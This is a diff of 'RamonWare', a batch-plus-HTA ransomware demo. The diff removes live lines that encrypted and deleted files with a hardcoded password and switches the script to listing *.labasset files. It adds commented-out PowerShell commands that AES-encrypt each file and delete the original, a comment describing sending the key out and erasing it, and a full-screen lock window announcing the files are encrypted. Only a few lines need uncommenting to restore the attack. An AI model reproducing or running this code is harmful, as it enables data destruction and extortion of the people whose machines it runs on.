@@ -1,31 +1,22 @@
 <!-- :: Batch Section
 @Echo OFF
 mode con:cols=50 lines=2
-set pass=SegoCode
 
-Title Ramon Ware
+Title RamonWare
 
 echo Scanning. . . .
 
-REM Set the root path for the operation
+REM Scan only: list matching files. Nothing is encrypted or deleted.
 set ROOT_PATH=%homedrive%\
-
-REM Start the loop searching for files with the .123test extension in all folders and subfolders on the drive
-FOR /R "%ROOT_PATH%" %%X in (*.123test) DO (
-    REM Safe Mode: Uncomment the following lines to activate safe mode. Safe mode is intended for use during development or in a test environment to prevent data loss.
-    REM Save the original filename to a text file for future reference
-    REM echo %%X >> %homedrive%\Original.txt
-
-    REM Change the original file's extension to .bak to preserve it instead of deleting it
-    REM ren "%%X" "%%~nX.bak"
-
-    REM Normal Mode: Encrypt the file and then delete it
-    REM Comment out the following two lines to deactivate normal mode and activate safe mode
-    aescrypt -e -p %pass% "%%X"
-    del "%%X"
+FOR /R "%ROOT_PATH%" %%X in (*.labasset) DO (
+    echo %%X >> %homedrive%\Original.txt
+    REM Uncomment to AES-encrypt each file and delete the original.
+    REM Generate %pass% here, send it out, then erase it from this PC.
+    REM powershell -NoProfile -Command "$a=[Security.Cryptography.Aes]::Create(); $a.Key=[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes('%pass%')); $a.GenerateIV(); $b=[IO.File]::ReadAllBytes('%%X'); [IO.File]::WriteAllBytes('%%X.aes',$a.IV+$a.CreateEncryptor().TransformFinalBlock($b,0,$b.Length))"
+    REM del "%%X"
+    REM powershell -NoProfile -Command "$a=[Security.Cryptography.Aes]::Create(); $a.Key=[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes('%pass%')); $d=[IO.File]::ReadAllBytes('%%X.aes'); $a.IV=[byte[]]($d[0..15]); [IO.File]::WriteAllBytes('%%X',$a.CreateDecryptor().TransformFinalBlock($d,16,$d.Length-16))"
 )
 
-REM Block Screen
 cls
 setlocal
 for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"
@@ -33,35 +24,42 @@ for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"
 -->
 
 <html>
-    <head>
-        <title>CryptMSG</title>
-    <hta:application id="oBVC" 
-                     applicationname="BSOD"  
-                     version="1.0" 
-                     maximizebutton="no" 
-                     minimizebutton="no" 
-                     sysmenu="no" 
-                     Caption="no" 
-                     windowstate="maximize"/> 
+<head>
+    <title>RamonWare</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=9">
+    <hta:application id="ramonWare"
+                     applicationname="RamonWare"
+                     version="1.0"
+                     maximizebutton="no"
+                     minimizebutton="no"
+                     sysmenu="no"
+                     caption="no"
+                     windowstate="maximize"/>
     <style>
-        #texto2{
+        html, body {
+            margin: 0;
+            height: 100%;
+            overflow: hidden;
+            background: #8c1d1d;
+            color: #fff;
+            font: 16px "Lucida Console", monospace;
+        }
+        #title {
+            text-align: center;
+            letter-spacing: 1px;
+        }
+        #message {
             padding-top: 19%;
             letter-spacing: 1px;
             text-align: center;
         }
     </style>
 </head>
-<body bgcolor="#8c1d1d" scroll="no">
-    <font face="Lucida Console" size="4" color="white">
-<center><p> - RamonWare Crypt - </p></center>
-<div id="texto2">
-    Oops, Your Files Have Been Encrypted!<br>
-    <br><br>
-    Now you need run RamonDecryptor, be careful next time<br>
-    <br><br>
-   Github.com/SegoCode<br>
-    <br><br><br>
-    <img id="imagen" alt="Candado" src="https://i.imgur.com/rytGPFG.png" height="130" width="100">
-</div>
+<body>
+    <p id="title"> - RamonWare - </p>
+    <div id="message">
+        Ooops, your files have been encrypted!<br><br><br>
+        Github.com/SegoCode<br>
+    </div>
 </body>
 </html>
